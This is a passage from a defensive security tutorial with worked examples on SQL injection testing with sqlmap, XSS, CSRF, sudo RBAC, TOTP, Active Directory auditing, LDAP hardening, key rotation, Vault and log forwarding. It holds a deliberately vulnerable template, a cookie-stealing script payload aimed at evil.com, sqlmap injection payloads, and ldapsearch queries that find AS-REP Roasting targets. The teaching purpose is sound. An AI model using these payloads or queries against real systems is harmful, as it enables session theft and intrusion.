  --dbms=sqlite \                     # => hint the DBMS type for faster detection
  2>&1 | grep -E "injectable|Parameter"

# Expected output for VULNERABLE endpoint:
# Parameter: username (GET)
#     Type: boolean-based blind
#         Payload: username=test' AND 5658=5658 AND 'DVOU'='DVOU
#     Type: UNION query
#         Payload: username=test' UNION ALL SELECT NULL,sqlite_version()--
# => sqlmap found two injection techniques: boolean-blind and UNION-based
# => UNION query allows direct data extraction in one request

# Run sqlmap against PATCHED endpoint (should find nothing)
sqlmap -u "http://localhost:5000/api/user/safe?username=test" \
  --batch --level=3 --risk=1 --dbms=sqlite \
  2>&1 | grep "not injectable\|all tested parameters"
# => "all tested parameters do not appear to be injectable"
# => confirms parameterization eliminates the injection vector
```

**Key Takeaway:** Parameterized queries (also called prepared statements) are the only reliable
defense against SQL injection — input validation and escaping alone are insufficient because
edge cases exist in every encoding implementation.

**Why It Matters:** SQL injection has been the top or second-ranked web application vulnerability
for over two decades (OWASP Top 10) because it is easy to introduce and devastating in impact:
authentication bypass, full data exfiltration, and in some databases, OS command execution.
Parameterized queries are a drop-in replacement for string concatenation with zero performance
penalty and complete protection against injection. Every ORM and modern database driver supports
them natively.

---

## Example 39: XSS Detection and Mitigation

**What this covers:** Cross-site scripting (XSS) occurs when user-supplied data is rendered in
HTML without proper escaping, allowing attackers to inject scripts executed in other users'
browsers. This example shows a vulnerable Jinja2 template, the fix, and a Content Security Policy
header that limits damage even when escaping fails.

**Scenario:** A Flask web application renders a search results page that echoes the query
parameter back into HTML. A security test reveals it is vulnerable to reflected XSS.

```python
# --- VULNERABLE template rendering (app.py) ---
from flask import Flask, request, render_template_string

app = Flask(__name__)

VULNERABLE_TEMPLATE = """
<html>
  <body>
    <!-- VULNERABILITY: |safe filter disables Jinja2 auto-escaping -->
    <h1>Results for: {{ query|safe }}</h1>
    <!-- => if query = "<script>document.location='http://evil.com?c='+document.cookie</script>"
         the script tag renders and executes in the victim's browser
         => attacker harvests session cookies, bypassing authentication -->
  </body>
</html>
"""

@app.route('/search')
def search_vulnerable():
    query = request.args.get('q', '')
    return render_template_string(VULNERABLE_TEMPLATE, query=query)
    # => |safe bypasses escaping; attacker controls what script runs in victim's browser


# --- PATCHED template rendering ---
SAFE_TEMPLATE = """
<html>
  <body>
    <!-- FIX: no |safe filter; Jinja2 auto-escaping is active by default -->
    <h1>Results for: {{ query }}</h1>
    <!-- => query = "<script>alert(1)</script>" renders as:
         <h1>Results for: &lt;script&gt;alert(1)&lt;/script&gt;</h1>
         => HTML entities prevent script execution; displayed as literal text -->
  </body>
</html>
"""

@app.route('/search/safe')
def search_safe():
    query = request.args.get('q', '')
    return render_template_string(SAFE_TEMPLATE, query=query)
    # => Jinja2 escapes <, >, ", ', & to HTML entities automatically
```

```nginx
# --- nginx: Add Content-Security-Policy header (defense-in-depth) ---
# /etc/nginx/sites-available/myapp.conf

server {
    listen 443 ssl;
    server_name app.example.com;

    # CSP header restricts which resources the browser will load
    add_header Content-Security-Policy
        "default-src 'self'; "            # => all resource types default to same-origin only
        "script-src  'self'; "            # => scripts only from same origin; no inline scripts
        "style-src   'self'; "            # => stylesheets from same origin only
        "img-src     'self' data:; "      # => images from same origin or inline data: URIs
        "frame-ancestors 'none'; "        # => prevents page from being embedded in iframes (clickjacking)
        "object-src  'none';"             # => blocks Flash, Java applets entirely
        always;
    # => even if XSS payload is injected, CSP blocks execution of inline scripts and
    #    external script loads from attacker-controlled domains

    add_header X-Content-Type-Options "nosniff" always;
    # => prevents browser MIME-type sniffing; mitigates content-type confusion attacks

    add_header X-Frame-Options "DENY" always;
    # => legacy clickjacking protection; redundant with frame-ancestors CSP but kept for
    #    compatibility with older browsers that do not support CSP

    location / {
        proxy_pass http://127.0.0.1:5000;
    }
}
```

**Key Takeaway:** Auto-escaping in the templating engine is the primary XSS defense; Content
Security Policy is a critical secondary layer that limits the impact when escaping is bypassed
through developer error or template injection vulnerabilities.

**Why It Matters:** XSS enables session hijacking, credential theft, and full account takeover
without the victim taking any unusual action beyond visiting a page. Reflected XSS is trivially
weaponized by sending a crafted link. Stored XSS (in comments, profiles) persists and attacks
every user who views the content. A strict CSP with `script-src 'self'` eliminates the most
dangerous XSS payloads even when a vulnerability exists, buying time for proper remediation.

---

## Example 40: CSRF Protection

**What this covers:** Cross-site request forgery (CSRF) tricks an authenticated user's browser
into submitting requests to a site where the user is logged in, without the user's knowledge.
Django's CSRF middleware implements the synchronizer token pattern to prevent this attack.

**Scenario:** A Django application has a funds-transfer endpoint. Without CSRF protection, an
attacker's page can silently trigger a transfer when a logged-in user visits it. This example
traces the full CSRF token lifecycle.

```python
# --- Django CSRF middleware (enabled by default in settings.py) ---

# settings.py
MIDDLEWARE = [
    'django.middleware.csrf.CsrfViewMiddleware',  # => must be in middleware list
    # => CsrfViewMiddleware checks all POST/PUT/PATCH/DELETE requests for valid token
    # => GET requests are exempt (must be idempotent by RFC 7231)
    ...
]

# --- How the CSRF token lifecycle works ---

# Step 1: Django sets a CSRF cookie on the first GET request to any page
# Browser GET /transfer-page/ → Django response includes:
# Set-Cookie: csrftoken=AbCdEf1234567890; SameSite=Lax; Path=/
# => csrftoken is a random 64-char hex value generated per session
# => SameSite=Lax prevents cross-origin cookies from being sent on top-level navigation
```

```html
<!-- Step 2: Template embeds the CSRF token in every form as a hidden field -->
<!-- templates/transfer.html -->
<form method="POST" action="/transfer/">
  <!-- {% csrf_token %} renders a hidden input with the current token -->
  {% csrf_token %}
  <!-- => renders as: <input type="hidden" name="csrfmiddlewaretoken" value="AbCdEf1234567890"> -->
  <!-- => value matches the csrftoken cookie value -->

  <input type="text" name="recipient" placeholder="Recipient account" />
  <input type="number" name="amount" placeholder="Amount" />
  <button type="submit">Transfer</button>
</form>

<!-- WHY THIS WORKS:
     An attacker's page at evil.com CANNOT read the csrftoken cookie
     (same-origin policy prevents cross-origin cookie reads).
     The attacker cannot forge a form with a matching csrfmiddlewaretoken value.
     Django's middleware rejects any POST where cookie != form token.
-->
```

```python
# --- views.py: CSRF-protected transfer view ---
from django.views.decorators.csrf import csrf_protect
from django.http import HttpResponse, HttpResponseForbidden

@csrf_protect   # => explicit decorator; redundant if CsrfViewMiddleware is active
def transfer(request):
    if request.method == 'POST':
        # By the time code reaches here, CsrfViewMiddleware has already verified:
        # request.POST['csrfmiddlewaretoken'] == request.COOKIES['csrftoken']
        # => Django returns 403 Forbidden automatically if tokens do not match

        recipient = request.POST.get('recipient')
        amount    = request.POST.get('amount')
        # => proceed with transfer; request is authentic
        return HttpResponse(f"Transfer of {amount} to {recipient} complete.")
    return render(request, 'transfer.html')

# --- Testing CSRF protection ---
# Legitimate POST (from same-origin form): succeeds (200 OK)
# Attacker POST (no csrfmiddlewaretoken):  403 Forbidden
# Attacker POST (guessed token):           403 Forbidden (token is 64-char random; infeasible to guess)

# For AJAX requests, read the token from the cookie and send as X-CSRFToken header
# JavaScript: const token = document.cookie.match(/csrftoken=([^;]+)/)[1];
# fetch('/transfer/', { method: 'POST', headers: {'X-CSRFToken': token}, body: formData })
# => X-CSRFToken header carries token for AJAX; Django middleware accepts cookie OR header match
```

**Key Takeaway:** The CSRF synchronizer token pattern works because an attacker's origin cannot
read the victim's cookies (same-origin policy), so they cannot replicate the token value that
Django requires in every state-changing request.

**Why It Matters:** CSRF exploits trust the server has in the user's browser rather than
vulnerabilities in the code itself. A successful CSRF attack on a banking application can
silently transfer funds; on an admin panel it can create privileged accounts. Django's built-in
CSRF middleware requires zero additional code for standard form submissions and is one of the
few security controls that can be considered virtually free to implement. Disabling it via
`@csrf_exempt` should require documented justification and compensating controls.

---

## Example 41: RBAC Configuration

**What this covers:** Role-based access control (RBAC) on Linux assigns users to groups
with specific file permissions and sudo rules, implementing the principle of least privilege.
This example creates three roles — developer, deployer, and auditor — with distinct capabilities.

**Scenario:** A Ubuntu 22.04 production server hosts an application. Three job roles need
different access levels: developers read logs, deployers restart services, auditors read system
configs but cannot modify anything.

```bash
# --- Create system groups for each role ---
groupadd developers    # => group for developers (log readers)
groupadd deployers     # => group for deployers (service restarters)
groupadd auditors      # => group for auditors (read-only config access)

# --- Assign users to groups ---
usermod -aG developers alice    # => alice added to developers; -aG appends (not replaces)
usermod -aG deployers  bob      # => bob added to deployers
usermod -aG auditors   carol    # => carol added to auditors

# --- Set file permissions for the application ---
APP_DIR=/opt/myapp

# Log directory: developers and auditors need read access
chown -R root:developers "${APP_DIR}/logs"
chmod -R 750 "${APP_DIR}/logs"
# => 750: owner(root)=rwx, group(developers)=r-x, other=---
# => developers can read/list logs; others have no access

# Config directory: auditors need read access only
chown -R root:auditors "${APP_DIR}/config"
chmod -R 640 "${APP_DIR}/config"
# => 640: owner(root)=rw-, group(auditors)=r--, other=---
# => auditors can read config files; cannot modify (no write bit)

# Application binaries: only root and deployers run them
chown -R root:deployers "${APP_DIR}/bin"
chmod -R 750 "${APP_DIR}/bin"
# => deployers can execute; developers and auditors cannot

# --- sudoers configuration via /etc/sudoers.d/ ---
# NEVER edit /etc/sudoers directly; use visudo or drop files in sudoers.d

# Deployers: restart myapp service only (no password prompt in automation)
cat > /etc/sudoers.d/deployers << 'EOF'
# Deployers can restart/start/stop the myapp service with no password
%deployers ALL=(root) NOPASSWD: /bin/systemctl restart myapp, \
                                /bin/systemctl start myapp,   \
                                /bin/systemctl stop myapp
# => %deployers = group syntax; applies to all members
# => NOPASSWD: required for CI/CD pipelines that run non-interactively
# => command list restricted to exact binary paths with no wildcards
EOF
chmod 440 /etc/sudoers.d/deployers   # => sudoers files must be 440 or visudo rejects them

# Auditors: read system journal (no password) — cannot run anything else as root
cat > /etc/sudoers.d/auditors << 'EOF'
%auditors ALL=(root) NOPASSWD: /bin/journalctl -u myapp, \
                               /bin/journalctl --no-pager
# => auditors can read service logs via journalctl; nothing else
EOF
chmod 440 /etc/sudoers.d/auditors

# --- Verify permissions ---
sudo -l -U alice    # => lists alice's allowed commands; should show nothing (no sudo)
sudo -l -U bob      # => should show systemctl restart/start/stop myapp
sudo -l -U carol    # => should show journalctl commands only

# Test as deployer (bob)
sudo -u bob sudo systemctl restart myapp   # => succeeds (allowed)
sudo -u bob sudo systemctl reboot          # => fails: "Sorry, user bob is not allowed..."
```

**Key Takeaway:** Granular sudo rules with exact command paths and no wildcards prevent privilege
escalation — a deployer who can run `sudo /usr/bin/vim` can trivially become root by opening a
shell from vim's command mode.

**Why It Matters:** Least-privilege role separation limits the blast radius of compromised
credentials. If an attacker steals bob's credentials, they can only restart the application
service — they cannot read sensitive configs, escalate to root, or pivot laterally. On shared
servers, group-based file permissions enforce separation without requiring separate VMs or
containers per role, making it a cost-effective control in constrained environments.

---

## Example 42: TOTP MFA Setup

**What this covers:** Time-based One-Time Passwords (TOTP) implement RFC 6238, generating
six-digit codes that change every 30 seconds using a shared secret and the current timestamp.
This example uses the pyotp library to implement TOTP enrollment and verification in Python.

**Scenario:** A web application needs to add TOTP-based MFA to its login flow. The enrollment
flow generates a QR code URI that users scan with an authenticator app; subsequent logins verify
the TOTP code before granting access.

```python
import pyotp                    # => pip install pyotp
import qrcode                   # => pip install qrcode[pil]
import time

# --- ENROLLMENT: generate a secret and QR code URI ---

def enroll_user_totp(username: str) -> dict:
    # Generate a cryptographically random base32 secret (20 bytes = 160 bits)
    secret = pyotp.random_base32()
    # => secret: "JBSWY3DPEHPK3PXP" (example; actual value is random)
    # => base32 encoding because authenticator apps display/import it as a string

    # Create a TOTP object bound to this secret
    totp = pyotp.TOTP(secret)
    # => pyotp.TOTP uses SHA-1 HMAC by default (RFC 6238 standard)
    # => default: 6-digit code, 30-second time step

    # Generate an otpauth:// URI for QR code encoding
    provisioning_uri = totp.provisioning_uri(
        name=username,
        issuer_name="MyApp"
    )
    # => provisioning_uri = "otpauth://totp/MyApp:alice?secret=JBSWY3D...&issuer=MyApp"
    # => authenticator apps (Google Authenticator, Authy) parse this URI from a QR code

    # Save the secret securely in the database (encrypted at rest)
    # db.save_totp_secret(user_id=username, secret=encrypt(secret))
    # => NEVER store the secret in plaintext; use AES-256 encryption or HSM

    return {
        "secret": secret,
        "provisioning_uri": provisioning_uri
    }

# --- VERIFICATION: validate a TOTP code at login ---

def verify_totp(stored_secret: str, user_provided_code: str) -> bool:
    totp = pyotp.TOTP(stored_secret)
    # => reconstruct TOTP from stored secret; same parameters as enrollment

    # Verify the code with a ±1 time-step window (handles clock skew up to 30s)
    is_valid = totp.verify(user_provided_code, valid_window=1)
    # => valid_window=1: accepts codes from current step, one step before, one step after
    # => prevents rejection due to user submitting code just before 30s boundary
    # => valid_window should NOT exceed 1 (larger windows reduce security)

    return is_valid
    # => True = code is valid, allow login (proceed to session creation)
    # => False = code is invalid or expired; deny login; increment failure counter

# --- DEMONSTRATION ---
result = enroll_user_totp("alice@example.com")
print(f"Secret:           {result['secret']}")
# => Secret: JBSWY3DPEHPK3PXP

print(f"Provisioning URI: {result['provisioning_uri']}")
# => otpauth://totp/MyApp:alice%40example.com?secret=JBSWY3D...&issuer=MyApp

# Simulate generating the current code (what the authenticator app shows)
totp = pyotp.TOTP(result['secret'])
current_code = totp.now()
print(f"Current TOTP code: {current_code}")
# => Current TOTP code: 836492  (changes every 30 seconds)

# Verify the code
is_valid = verify_totp(result['secret'], current_code)
print(f"Verification: {'PASS' if is_valid else 'FAIL'}")
# => Verification: PASS

# Show remaining seconds until code expires
remaining = 30 - (int(time.time()) % 30)
print(f"Code valid for {remaining} more seconds")
# => Code valid for 14 more seconds
```

**Key Takeaway:** TOTP codes are cryptographically tied to both the shared secret and the
current timestamp, meaning a code intercepted from a legitimate authentication is useless after
its 30-second window, defeating most credential replay attacks.

**Why It Matters:** Passwords are routinely stolen via phishing, data breaches, and credential
stuffing. TOTP MFA adds a second factor that attackers cannot reuse from a breach dump. Unlike
SMS OTP (which is vulnerable to SIM swapping), TOTP secrets never leave the user's authenticator
app. The pyotp library makes TOTP enrollment and verification a ten-line addition to any Python
authentication flow, with no third-party service dependency or per-message cost.

---

## Example 43: Active Directory Security Basics

**What this covers:** Active Directory (AD) is the identity and access management backbone of
most enterprise Windows environments. This example uses ldapsearch to enumerate privileged groups
and identify over-privileged users, a fundamental step in both AD security hardening and red team
reconnaissance.

**Scenario:** A security analyst on Ubuntu 22.04 queries an Active Directory domain
(corp.example.com, DC at 10.x.1.10) to enumerate members of privileged groups as part of an
access review.

```bash
# Install LDAP client tools
apt-get install -y ldap-utils    # => provides ldapsearch, ldapmodify, ldapadd

# --- Basic AD query: enumerate all privileged groups ---

# Query the Domain Admins group membership
ldapsearch \
  -H ldap://10.x.1.10 \                  # => LDAP server: domain controller IP
  -D "analyst@corp.example.com" \        # => bind DN: use analyst service account
  -W \                                   # => -W prompts for password interactively
  -b "DC=corp,DC=example,DC=com" \       # => search base: entire domain
  -s sub \                               # => scope: subtree (recursive)
  "(sAMAccountName=Domain Admins)" \     # => filter: find the Domain Admins group object
  member                                 # => attribute to return: member (list of DNs)

# Expected output (annotated):
# dn: CN=Domain Admins,CN=Users,DC=corp,DC=example,DC=com
# member: CN=Administrator,CN=Users,DC=corp,DC=example,DC=com
# member: CN=John Smith,OU=Employees,DC=corp,DC=example,DC=com
# member: CN=svc-backup,CN=ServiceAccounts,DC=corp,DC=example,DC=com
# => Domain Admins should contain only named admin accounts, not service accounts
# => svc-backup in Domain Admins is a finding: service accounts should not be domain admins

# Query all groups with adminCount=1 (protected from accidental permission inheritance)
ldapsearch \
  -H ldap://10.x.1.10 \
  -D "analyst@corp.example.com" -W \
  -b "DC=corp,DC=example,DC=com" \
  "(adminCount=1)" \                     # => adminCount=1 marks high-privilege objects
  sAMAccountName distinguishedName
# => returns all users and groups in the SDProp protected group set
# => includes: Domain Admins, Enterprise Admins, Schema Admins, Account Operators, Backup Operators

# Find users with the "Do not require Kerberos preauthentication" flag (AS-REP Roasting target)
ldapsearch \
  -H ldap://10.x.1.10 \
  -D "analyst@corp.example.com" -W \
  -b "DC=corp,DC=example,DC=com" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName userAccountControl
# => userAccountControl flag 4194304 = DONT_REQ_PREAUTH
# => users with this flag are vulnerable to AS-REP Roasting (offline password cracking)
# => any non-blank result is a finding; disable this flag unless required by legacy application

# Find accounts that have not logged in for 90+ days (stale accounts = attack surface)
ldapsearch \
  -H ldap://10.x.1.10 \
  -D "analyst@corp.example.com" -W \
  -b "DC=corp,DC=example,DC=com" \
  "(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" \
  sAMAccountName lastLogonTimestamp \
  | grep -E "sAMAccountName|lastLogonTimestamp"
# => lists all enabled user accounts with last logon timestamp
# => convert lastLogonTimestamp from Windows FILETIME to Unix timestamp:
#    python3 -c "print((int('133000000000000000') - 116444736000000000) // 10000000)"
# => stale accounts should be disabled or deleted; they are prime targets for attackers
```

**Key Takeaway:** Service accounts in privileged groups (Domain Admins, Enterprise Admins)
represent the highest-risk misconfiguration in Active Directory — a compromised service account
with domain admin rights gives an attacker complete control of every Windows machine in the
domain.

**Why It Matters:** Active Directory misconfigurations are the root cause of the majority of
enterprise breach escalations. Attackers routinely use ldapsearch-equivalent queries as the
first step after gaining a foothold, because AD exposes its entire schema to any authenticated
user by default. Regular privileged group audits, removal of stale accounts, and disabling
AS-REP Roasting-vulnerable flags are among the highest-impact, lowest-cost AD hardening actions
available to defenders.

---

## Example 44: LDAP Authentication Hardening

**What this covers:** LDAP authentication for Linux systems using PAM or application-level
binds is insecure by default — credentials travel in cleartext. This example configures
/etc/ldap/ldap.conf to enforce StartTLS encryption and restrict the service account bind DN
to minimum required privileges.

**Scenario:** A Ubuntu 22.04 application server uses LDAP to authenticate users against an
OpenLDAP directory at ldap.corp.example.com. The current configuration sends bind credentials
in cleartext over port 389.

```bash
# --- /etc/ldap/ldap.conf (system-wide LDAP client configuration) ---

cat > /etc/ldap/ldap.conf << 'EOF'
# LDAP server URI — use ldap:// (StartTLS upgrades to encrypted after connect)
# DO NOT use ldaps:// here (port 636) unless you have a separate LDAPS certificate
URI ldap://ldap.corp.example.com

# Base DN for all searches
BASE dc=corp,dc=example,dc=com

# TLS configuration
TLS_CACERT /etc/ssl/certs/ca-certificates.crt
# => validates server certificate against system CA bundle
# => prevents man-in-the-middle by verifying server identity

TLS_REQCERT demand
# => demand = abort connection if server certificate cannot be verified
# => options: never (skip verification) | allow (warn but continue) | demand (fail)
# => NEVER use "never" or "allow" in production (defeats TLS security)

# Require StartTLS before any bind or search operation
TLS_CIPHER_SUITE HIGH:!aNULL:!MD5
# => HIGH: strong ciphers only
# => !aNULL: no anonymous (unauthenticated) cipher suites
# => !MD5: exclude broken MD5-based MACs
EOF

# --- Application-level LDAP bind configuration (Python ldap3 example) ---

cat > /opt/myapp/ldap_config.py << 'EOF'
from ldap3 import Server, Connection, Tls, SIMPLE, SYNC, SUBTREE
import ssl

# Create TLS context requiring valid server certificate
tls_config = Tls(
    validate=ssl.CERT_REQUIRED,          # => verify server cert; reject self-signed unless CA trusted
    version=ssl.PROTOCOL_TLS_CLIENT,     # => use TLS client mode (enforces hostname verification)
    ca_certs_file='/etc/ssl/certs/ca-certificates.crt'
    # => CA bundle path; must contain the cert that signed the LDAP server's certificate
)

# Create server object with TLS config
server = Server(
    'ldap.corp.example.com',
    port=389,                            # => standard LDAP port (not 636/LDAPS)
    use_ssl=False,                       # => False = start with plain LDAP, upgrade via StartTLS
    tls=tls_config,
    get_info='ALL'                       # => retrieve server schema and capabilities
)

# Service account bind DN: minimum-privilege read-only account
BIND_DN = "cn=svc-ldap-reader,ou=service-accounts,dc=corp,dc=example,dc=com"
# => service account with ONLY read permission on user attributes needed for authentication
# => NOT an admin account; cannot modify directory, read password hashes, or see all attributes
BIND_PASSWORD = "read-from-vault"       # => retrieve from secrets manager, never hardcode

conn = Connection(
    server,
    user=BIND_DN,
    password=BIND_PASSWORD,
    authentication=SIMPLE,              # => SIMPLE auth over StartTLS is acceptable
    client_strategy=SYNC,
    auto_bind='NO_TLS'                  # => bind after StartTLS upgrade
)

# Perform StartTLS upgrade BEFORE binding (critical ordering)
conn.start_tls()                        # => upgrades connection to TLS; all subsequent traffic encrypted
# => if start_tls() fails (bad cert, no TLS support), exception raised; connection aborted

conn.bind()                             # => bind with credentials AFTER TLS is established
# => credential transmission over encrypted channel

# Search for user (authentication query)
conn.search(
    search_base='ou=users,dc=corp,dc=example,dc=com',
    search_filter='(uid=alice)',
    search_scope=SUBTREE,
    attributes=['uid', 'mail', 'memberOf']
    # => request only needed attributes; do NOT request userPassword
)
EOF

# Verify StartTLS is working with ldapsearch
ldapsearch -H ldap://ldap.corp.example.com \
  -ZZ \                                 # => -ZZ = require StartTLS (fail if not available)
  -D "cn=svc-ldap-reader,ou=service-accounts,dc=corp,dc=example,dc=com" \
  -W \
  -b "dc=corp,dc=example,dc=com" \
  "(uid=alice)" mail
# => if connection succeeds, StartTLS is working
# => if error "ldap_start_tls: Operations error", server does not support StartTLS
```

**Key Takeaway:** StartTLS must be established before the bind operation — authenticating first
and then upgrading to TLS leaves credentials exposed in cleartext during the window before
encryption is negotiated.

**Why It Matters:** Unencrypted LDAP binds are a common finding in enterprise security audits
because LDAP on port 389 defaults to cleartext. Any attacker with network access between the
application server and the LDAP directory can capture bind credentials with a single tcpdump
command. Using a minimum-privilege service account for the bind DN limits the damage if those
credentials are captured: a read-only account cannot modify the directory or escalate privileges.

---

## Example 45: API Key Rotation Workflow

**What this covers:** API key rotation replaces credentials on a fixed schedule or after a
potential compromise without service interruption. This example implements a bash rotation
script that generates a new key, distributes it to services, verifies the new key works, then
revokes the old key.

**Scenario:** A microservice authenticates to an internal data API using a static API key stored
in /etc/myapp/api.env. The security team requires 90-day rotation with zero downtime.

```bash
#!/usr/bin/env bash
# rotate-api-key.sh — zero-downtime API key rotation script
set -euo pipefail                        # => exit on error, unset vars, pipe failures

API_BASE="https://api.internal.example.com"
SERVICE_CONFIG="/etc/myapp/api.env"
VAULT_PATH="secret/myapp/api-key"        # => HashiCorp Vault path (see Example 46)

# --- Step 1: Retrieve the current active key ---
OLD_KEY=$(vault kv get -field=api_key "${VAULT_PATH}")
# => reads current key from Vault (preferred over plaintext file)
echo "Retrieved current key (last 4 chars): ...${OLD_KEY: -4}"
# => log only last 4 characters; never log full keys

# --- Step 2: Generate a new cryptographically random API key ---
NEW_KEY=$(openssl rand -hex 32)
# => 32 bytes = 256 bits of entropy; hex-encoded = 64 character string
# => openssl rand uses /dev/urandom; suitable for API keys

echo "Generated new key (last 4 chars): ...${NEW_KEY: -4}"

# --- Step 3: Register new key with the API server (dual-key window opens) ---
REGISTER_RESPONSE=$(curl -sf \
  -H "Authorization: Bearer ${OLD_KEY}" \
  -H "Content-Type: application/json" \
  -X POST "${API_BASE}/admin/keys" \
  -d "{\"key\": \"${NEW_KEY}\", \"label\": \"rotated-$(date +%Y%m%d)\"}")
# => POST creates new key while OLD_KEY is still valid
# => API must support multiple active keys to allow zero-downtime rotation
# => both OLD_KEY and NEW_KEY are valid during the transition window

echo "Registration: $(echo "$REGISTER_RESPONSE" | jq -r '.status')"
# => status: "created" confirms new key registered

# --- Step 4: Verify new key works before revoking old key ---
VERIFY_STATUS=$(curl -sf -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer ${NEW_KEY}" \
  "${API_BASE}/health")
# => -o /dev/null discards response body; -w "%{http_code}" returns HTTP status code

if [[ "$VERIFY_STATUS" != "200" ]]; then
    echo "ERROR: New key verification failed (HTTP ${VERIFY_STATUS}). Aborting rotation."
    exit 1
fi
# => abort rotation if new key does not authenticate; prevents self-lockout

echo "New key verified: HTTP ${VERIFY_STATUS}"

# --- Step 5: Update service configuration with new key ---
# Write new key to Vault (audit log records the change)
vault kv put "${VAULT_PATH}" api_key="${NEW_KEY}" rotated_at="$(date -Iseconds)"
# => Vault stores versioned secret; old version retained for 24h for rollback

# Update local env file (service reloads on next restart)
printf "API_KEY=%s\nROTATED_AT=%s\n" "${NEW_KEY}" "$(date -Iseconds)" \
  | install -m 600 /dev/stdin "${SERVICE_CONFIG}"
# => install -m 600 creates file with 0600 permissions (owner-only read/write)
# => atomic: install uses rename(2) internally to avoid partial writes

# Signal service to reload configuration without restart
systemctl reload myapp 2>/dev/null || systemctl restart myapp
# => reload sends SIGHUP to myapp; if unsupported, fall back to restart

# --- Step 6: Revoke old key (dual-key window closes) ---
sleep 10  # => brief window for in-flight requests using old key to complete
curl -sf \
  -H "Authorization: Bearer ${NEW_KEY}" \
  -X DELETE "${API_BASE}/admin/keys/${OLD_KEY}"
# => revoke old key using NEW_KEY for authentication; old key no longer valid

echo "Rotation complete. Old key revoked."
```

**Key Takeaway:** Zero-downtime key rotation requires a dual-key acceptance window — register
the new key before revoking the old one, and verify the new key works before closing the window.

**Why It Matters:** Static API keys that never rotate become permanent backdoors when they
appear in git history, logs, or breach dumps. A 90-day rotation policy limits the useful
lifetime of a stolen key. Automating the rotation script as a cron job or CI/CD pipeline step
removes the human bottleneck that causes rotation policies to be skipped in practice. Storing
keys in Vault rather than config files provides audit trails, automatic expiry, and role-based
access to secret retrieval.

---

## Example 46: Secrets Management with HashiCorp Vault

**What this covers:** HashiCorp Vault provides centralized secrets management with
authentication, access policies, audit logging, and automatic secret versioning. This example
configures the KV v2 secrets engine, uses AppRole authentication for a service account, and
demonstrates reading and writing secrets.

**Scenario:** A microservice on Ubuntu 22.04 needs to retrieve database credentials at startup
without hardcoding them in config files. Vault runs at http://vault.test:8200.

```bash
# --- Initial Vault setup (run once by administrator) ---

# Authenticate to Vault as administrator
export VAULT_ADDR="http://vault.test:8200"
vault login              # => prompts for root token or admin credentials
# => production: use short-lived tokens issued via OIDC/LDAP, not root token

# Enable the KV v2 secrets engine at path "secret/"
vault secrets enable -path=secret kv-v2
# => kv-v2: key-value engine with versioning (retains 10 versions by default)
# => each write creates a new version; old versions accessible for rollback

# Store a database credential secret
vault kv put secret/myapp/database \
  username="myapp_user" \
  password="$(openssl rand -base64 32)" \
  host="db.internal.example.com" \
  port="5432"
# => stores four fields atomically under the path secret/myapp/database
# => password generated from 32 random bytes (high entropy)

# Read the secret back (verify it stored correctly)
vault kv get secret/myapp/database
# => output:
# ====== Secret Path ======
# secret/data/myapp/database
# ====== Metadata ======
# created_time    2026-05-21T00:00:00.000000000Z
# version         1
# ====== Data ======
# host        db.internal.example.com
# password    xKj9...randombase64...Zq==
# port        5432
# username    myapp_user

# --- AppRole authentication for the service ---

# Enable AppRole auth method
vault auth enable approle
# => AppRole: machine-to-machine auth using role_id + secret_id pair

# Create a policy granting read-only access to myapp secrets
vault policy write myapp-read-policy - << 'EOF'
path "secret/data/myapp/*" {
  capabilities = ["read"]
  # => read = GET access only; cannot create, update, or delete secrets
}
path "secret/metadata/myapp/*" {
  capabilities = ["list"]
  # => list = see which secret paths exist (not their values)
}
EOF
# => policy follows least-privilege: myapp can only read its own secrets

# Create an AppRole role for the service
vault write auth/approle/role/myapp-service \
  policies="myapp-read-policy" \
  secret_id_ttl="24h" \               # => secret_id expires after 24 hours (force rotation)
  token_ttl="1h" \                    # => access token expires after 1 hour
  token_max_ttl="4h"                  # => token cannot be renewed beyond 4 hours
# => short-lived tokens limit damage from token theft

# Retrieve the role_id (static, safe to embed in service config)
vault read auth/approle/role/myapp-service/role-id
# => role_id: "218b1b34-7a90-3b45-a5c2-a53a..." (deterministic for this role)

# Generate a secret_id (dynamic, rotate regularly)
vault write -f auth/approle/role/myapp-service/secret-id
# => secret_id: "1a2b3c4d-..." (single-use or time-limited; generate fresh per deployment)

# --- Service: authenticate and retrieve secrets at startup ---

# Service authenticates using role_id + secret_id pair
VAULT_TOKEN=$(vault write -field=token auth/approle/login \
  role_id="218b1b34-7a90-3b45-a5c2-a53a..." \
  secret_id="1a2b3c4d-...")
# => returns a short-lived access token (TTL: 1h as configured)

# Retrieve the database password using the access token
DB_PASSWORD=$(VAULT_TOKEN="$VAULT_TOKEN" vault kv get \
  -field=password secret/myapp/database)
# => DB_PASSWORD now holds the actual password in memory only
# => never written to disk, never in environment variables visible to other processes

echo "DB password retrieved (length: ${#DB_PASSWORD} chars)"
# => DB password retrieved (length: 44 chars)
```

**Key Takeaway:** AppRole's role_id + secret_id split means neither credential alone grants
access — role_id is semi-public (like a username) while secret_id is ephemeral and single-use
(like a time-limited OTP).

**Why It Matters:** Hardcoded secrets in config files are the leading cause of credential
exposure in cloud environments, routinely discovered in public git repositories and container
images. Vault replaces static secrets with dynamically issued, time-limited credentials that are
automatically audited — every read is logged with the requesting token's metadata. When a service
is decommissioned, revoking its AppRole immediately invalidates all credentials, with no manual
secret rotation required.

---

## Example 47: Centralized Log Aggregation

**What this covers:** Centralized log aggregation collects logs from multiple hosts into a
single destination, enabling correlation analysis, long-term retention, and SIEM integration.
This example configures rsyslog to forward logs to a central collector and logrotate to manage
local log retention on Ubuntu 22.04.

**Scenario:** A cluster of application servers must forward their syslog streams to a central
log server at 10.x.99.50:514 (UDP/TCP). Local logs rotate daily with 30-day retention.

```bash
# --- APPLICATION SERVER: /etc/rsyslog.d/50-forwarding.conf ---

cat > /etc/rsyslog.d/50-forwarding.conf << 'EOF'
# Load TCP output module (preferred over UDP for reliability)
module(load="omfwd")                 # => omfwd: output module for forwarding

# Forward all syslog facilities and severities to central collector
*.* action(
    type="omfwd"
    target="10.x.99.50"              # => central log server IP
    port="514"                       # => standard syslog port
    protocol="tcp"                   # => TCP: reliable delivery (retries on failure)
    # protocol="udp" loses messages on network congestion; avoid for security logs

    # Queue settings: buffer messages if central server is temporarily unreachable
    action.resumeRetryCount="-1"     # => retry indefinitely until connected
    queue.type="LinkedList"          # => in-memory queue (use "Disk" for disk-backed queue)
